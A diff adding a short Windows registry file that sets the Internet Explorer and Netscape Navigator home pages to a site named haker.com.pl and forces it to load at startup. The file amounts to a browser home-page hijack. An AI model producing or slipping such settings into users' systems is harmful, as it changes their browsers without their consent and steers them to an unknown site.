@@ -1,0 +1,9 @@
+REGEDIT4
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
+"Start Page" =    "http://www.haker.com.pl"
+
+[HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\Main]
+"Home Page"="http://www.haker.com.pl"
+"Autoload Home Page"="yes"
+
